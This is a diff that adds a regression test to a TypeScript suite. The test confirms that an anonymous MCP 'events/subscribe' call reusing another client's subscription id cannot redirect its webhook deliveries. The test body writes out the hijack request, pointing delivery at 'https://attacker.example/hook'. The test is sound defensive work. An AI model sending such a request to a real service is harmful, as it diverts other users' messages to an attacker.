@@ -206,3 +206,45 @@ describe('POST /fabric/messages', () => {
 		expect(await noSub.json()).toMatchObject({ delivered: false, reason: 'no_subscription' });
 	});
 });
+
+describe("The Dot's subscription", () => {
+	it('cannot be taken by an anonymous subscribe naming its id', async () => {
+		const seen = captureWebhooks();
+		const { store } = sqlStore();
+		const dot = await subscribe(store, DOT_CALLBACK, 'dot-thread');
+		await store.deliverFabricMessage(MESSAGE, dot);
+		seen.length = 0;
+
+		const mcp = createMcpRouter(undefined, () => store);
+		const hijack = await mcp.request('/', {
+			method: 'POST',
+			headers: { 'content-type': 'application/json' },
+			body: JSON.stringify({
+				jsonrpc: '2.0',
+				id: 3,
+				method: 'events/subscribe',
+				params: {
+					subscriptionId: dot,
+					delivery: { url: 'https://attacker.example/hook' },
+					filter: { correlationId: 'dot-thread' },
+					cursor: '0',
+				},
+			}),
+		});
+		const answer = (await hijack.json()) as any;
+		expect(answer.error?.data?.reason).toBe('subscription_conflict');
+		await new Promise((resolve) => setTimeout(resolve, 20));
+		expect(seen.filter((s) => s.url !== DOT_CALLBACK)).toHaveLength(0);
+		const subscriptions = await store.listSubscriptions();
+		expect(subscriptions.find((s) => s.id === dot)?.callbackUrl).toBe(DOT_CALLBACK);
+
+		// The Dot re-subscribing to its own callback still works.
+		const { subscription } = await store.subscribe({
+			subscriptionId: dot,
+			callbackUrl: DOT_CALLBACK,
+			secret: SECRET,
+			filter: { correlationId: 'dot-thread' },
+		});
+		expect(subscription.id).toBe(dot);
+	});
+});
